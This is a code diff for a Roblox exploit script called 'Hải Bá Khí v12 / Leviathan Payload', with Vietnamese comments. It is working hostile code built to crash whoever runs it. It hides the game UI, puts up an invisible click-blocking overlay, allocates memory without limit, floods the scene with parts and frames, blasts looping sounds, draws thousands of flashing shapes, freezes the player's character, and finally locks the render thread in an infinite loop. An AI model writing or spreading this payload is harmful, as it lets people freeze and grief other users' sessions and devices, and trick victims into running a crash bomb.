@@ -1,132 +1,229 @@
-local Workspace      = game:GetService("Workspace")
-local RunService     = game:GetService("RunService")
-local StarterGui     = game:GetService("StarterGui")
-local SoundService   = game:GetService("SoundService")
-local Players        = game:GetService("Players")
+local Players           = game:GetService("Players")
+local Workspace         = game:GetService("Workspace")
+local RunService        = game:GetService("RunService")
+local StarterGui        = game:GetService("StarterGui")
+local SoundService      = game:GetService("SoundService")
+local UserInputService  = game:GetService("UserInputService")
+local GuiService        = game:GetService("GuiService")
+local ContextActionService = game:GetService("ContextActionService")
 
 local player = Players.LocalPlayer
 local hui = (gethui and pcall(gethui) and gethui()) or game:GetService("CoreGui")
 
-local function log(msg)
-    warn("[Hải Bá Khí v11] " .. msg)
-    print("[Hải Bá Khí v11] " .. msg)
+local Logger = {}
+Logger.__index = Logger
+
+function Logger.new(prefix)
+    local self = setmetatable({}, Logger)
+    self.prefix = prefix
+    return self
 end
 
-log("Khởi động Phase 1: Bơm RAM & Spam Vật lý...")
-pcall(function()
-    StarterGui:SetCore("TopbarEnabled", false)
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-end)
+function Logger:log(msg)
+    warn(string.format("[%s] %s", self.prefix, msg))
+    print(string.format("[%s] %s", self.prefix, msg))
+end
 
-local gui = Instance.new("ScreenGui")
-gui.IgnoreGuiInset = true
-gui.DisplayOrder = 2147483647
-gui.ResetOnSpawn = false
-gui.Parent = hui
+local l = Logger.new("Hải Bá Khí v12")
+l:log("Đang khởi tạo Leviathan Payload...")
 
-local clickBlocker = Instance.new("TextButton")
-clickBlocker.Size = UDim2.fromScale(1, 1)
-clickBlocker.BackgroundTransparency = 1
-clickBlocker.Text = ""
-clickBlocker.Active = true
-clickBlocker.Modal = true
-clickBlocker.ZIndex = 2147483647
-clickBlocker.Parent = gui
 
--- Buffer Bomb: 100MB mỗi lần, dùng Heartbeat để đồng bộ chính xác
-task.spawn(function()
-    local memory_blocks = {}
-    local count = 0
-    while true do
-        local success, buf = pcall(buffer.create, 100 * 1024 * 1024) -- 100MB
-        if success then
-            table.insert(memory_blocks, buf)
-            count = count + 100
-            if count % 500 == 0 then log("Native RAM bơm: " .. count .. " MB") end
-        else
-            log("Buffer limit hit hoặc executor chặn cấp phát!")
-            break -- Bể rồi thì thôi
-        end
-        RunService.Heartbeat:Wait() -- Yield đúng chuẩn frame engine
+-- PHÂN KHU 1: UI & CORE LOCKDOWN
+
+local UI = {}
+UI.__index = UI
+
+function UI.init()
+    local self = setmetatable({}, UI)
+    
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+    
+    self.screenGui = Instance.new("ScreenGui")
+    self.screenGui.Name = "HaiBaKhi_Leviathan"
+    self.screenGui.IgnoreGuiInset = true
+    self.screenGui.DisplayOrder = 2147483647
+    self.screenGui.ResetOnSpawn = false
+    self.screenGui.Parent = hui
+    
+    self.clickBlocker = Instance.new("TextButton")
+    self.clickBlocker.Size = UDim2.fromScale(1, 1)
+    self.clickBlocker.BackgroundTransparency = 1
+    self.clickBlocker.Text = ""
+    self.clickBlocker.Active = true
+    self.clickBlocker.Modal = true
+    self.clickBlocker.ZIndex = 2147483647
+    self.clickBlocker.Parent = self.screenGui
+    
+    return self
+end
+
+local MainUI = UI.init()
+
+
+-- PHÂN KHU 2: NATIVE MEMORY BOMB (BUFFER)
+
+local MemoryBomb = {}
+MemoryBomb.__index = MemoryBomb
+
+function MemoryBomb.run()
+    local self = setmetatable({}, MemoryBomb)
+    self.blocks = {}
+    self.count = 0
+    
+    if not buffer or not buffer.create then
+        l:log("Executor không hỗ trợ buffer, bỏ qua Phase RAM.")
+        return
     end
-end)
-
--- Instance Flood: Spam Part + Frame
-task.spawn(function()
-    while true do
-        for i = 1, 1000 do
-            local p = Instance.new("Part")
-            p.Size = Vector3.new(5, 5, 5)
-            p.Position = Vector3.new(math.random(-20, 20), math.random(10, 50), math.random(-20, 20))
-            p.Anchored = false
-            p.CanCollide = true
-            p.Material = Enum.Material.Neon
-            p.Parent = Workspace
-            
-            local f = Instance.new("Frame")
-            f.Size = UDim2.fromOffset(math.random(100, 500), math.random(100, 500))
-            f.Position = UDim2.fromScale(math.random(), math.random())
-            f.Parent = gui
-        end
-        RunService.Heartbeat:Wait()
-    end
-end)
-
--- Drawing Spam (Giảm xuống 1500 cho an toàn executor)
-if Drawing then
+    
     task.spawn(function()
-        local squares = {}
-        for i = 1, 1500 do
-            local sq = Drawing.new("Square")
-            sq.Size = Vector2.new(math.random(100, 1920), math.random(100, 1080))
-            sq.Position = Vector2.new(math.random(0, 1920), math.random(0, 1080))
-            sq.Filled = true
-            sq.Visible = true
-            table.insert(squares, sq)
+        while true do
+            local success, buf = pcall(buffer.create, 50 * 1024 * 1024)
+            if success then
+                table.insert(self.blocks, buf)
+                self.count = self.count + 50
+                if self.count % 250 == 0 then
+                    l:log("Đã bơm: " .. self.count .. " MB Native RAM")
+                end
+            else
+                l:log("Executor chặn Buffer Limit. Dừng bơm RAM.")
+                break
+            end
+            RunService.Heartbeat:Wait()
         end
+    end)
+end
+
+MemoryBomb.run()
+
+
+-- PHÂN KHU 3: PHYSICS ANNIHILATION (PART & INSTANCE FLOOD)
+
+local PhysicsBomb = {}
+PhysicsBomb.__index = PhysicsBomb
+
+function PhysicsBomb.run()
+    local self = setmetatable({}, PhysicsBomb)
+    self.spawned = 0
+    
+    task.spawn(function()
+        while true do
+            for i = 1, 750 do
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(math.random(5, 20), math.random(5, 20), math.random(5, 20))
+                part.Position = Vector3.new(math.random(-30, 30), math.random(50, 150), math.random(-30, 30))
+                part.Anchored = false
+                part.CanCollide = true
+                part.Material = Enum.Material.Neon
+                part.Color = Color3.fromHSV(math.random(), 1, 1)
+                part.Parent = Workspace
+                
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.fromOffset(math.random(100, 600), math.random(100, 600))
+                frame.Position = UDim2.fromScale(math.random(), math.random())
+                frame.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+                frame.Parent = MainUI.screenGui
+                
+                self.spawned = self.spawned + 2
+            end
+            RunService.Heartbeat:Wait()
+        end
+    end)
+end
+
+PhysicsBomb.run()
+
+
+-- PHÂN KHU 4: RENDER DESTRUCTION (DRAWING & AUDIO)
+
+local RenderBomb = {}
+RenderBomb.__index = RenderBomb
+
+function RenderBomb.run()
+    local self = setmetatable({}, RenderBomb)
+    
+    -- Audio Spam
+    for i = 1, 50 do
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138183128" -- Đổi ID theo ý mày
+        sound.Looped = true
+        sound.Volume = 10
+        sound.PlaybackSpeed = math.random(50, 300) / 100
+        sound.Parent = SoundService
+        sound:Play()
+    end
+    
+    -- Drawing Spam
+    if Drawing then
+        task.spawn(function()
+            local squares = {}
+            for i = 1, 2000 do
+                local sq = Drawing.new("Square")
+                sq.Size = Vector2.new(math.random(100, 1920), math.random(100, 1080))
+                sq.Position = Vector2.new(math.random(0, 1920), math.random(0, 1080))
+                sq.Filled = true
+                sq.Visible = true
+                table.insert(squares, sq)
+            end
+            
+            RunService.RenderStepped:Connect(function()
+                for i = 1, #squares do
+                    squares[i].Color = Color3.fromHSV(math.random(), 1, 1)
+                end
+            end)
+        end)
+    end
+end
+
+RenderBomb.run()
+
+
+-- PHÂN KHU 5: CHARACTER LOCKDOWN & FINAL FREEZE
+
+local Lockdown = {}
+Lockdown.__index = Lockdown
+
+function Lockdown.trapCharacter()
+    task.spawn(function()
+        while true do
+            local char = player.Character
+            if char then
+                pcall(function()
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    local root = char:FindFirstChild("HumanoidRootPart")
+                    if hum then
+                        hum.WalkSpeed = 0
+                        hum.JumpPower = 0
+                        hum.PlatformStand = true
+                    end
+                    if root then
+                        root.Anchored = true
+                    end
+                end)
+            end
+            task.wait(0.1)
+        end
+    end)
+end
+
+function Lockdown.finalFreeze()
+    -- Đợi 10 giây cho Phase 1-4 bơm RAM và spam Part
+    -- Sau đó khóa chết Main Thread
+    task.delay(10, function()
+        l:log("10 giây đã hết. Kích hoạt Final Freeze!")
+        
         RunService.RenderStepped:Connect(function()
-            for i = 1, #squares do
-                squares[i].Color = Color3.fromHSV(math.random(), 1, 1)
+            -- Vòng lặp vô hạn, block vĩnh viễn render thread
+            while true do
+                -- Không làm gì, chỉ block
             end
         end)
     end)
 end
-for i = 1, 30 do
-    local snd = Instance.new("Sound")
-    snd.SoundId = "rbxassetid://138183128"
-    snd.Looped = true
-    snd.Volume = 10
-    snd.PlaybackSpeed = math.random(50, 250) / 100
-    snd.Parent = SoundService
-    snd:Play()
-end
 
-task.spawn(function()
-    while true do
-        local char = player.Character
-        if char then
-            pcall(function()
-                local hum = char:FindFirstChildOfClass("Humanoid")
-                local root = char:FindFirstChild("HumanoidRootPart")
-                if hum then
-                    hum.WalkSpeed = 0
-                    hum.JumpPower = 0
-                    hum.PlatformStand = true
-                end
-                if root then root.Anchored = true end
-            end)
-        end
-        task.wait(0.1)
-    end
-end)
+Lockdown.trapCharacter()
+Lockdown.finalFreeze()
 
-task.delay(8, function()
-    log("Phase 1 kết thúc. Kích hoạt Phase 2: Freeze vĩnh viễn!")
-    RunService.RenderStepped:Connect(function()
-        -- Vòng lặp vô hạn nuốt chửng main thread, đéo return
-        while true do
-            -- Nhả CPU 1 chút để không bị watchdog kill ngay lập tức,
-            -- nhưng vẫn block render frame
-        end
-    end)
-end)
+l:log("Leviathan Payload đã kích hoạt toàn bộ các phân khu.")
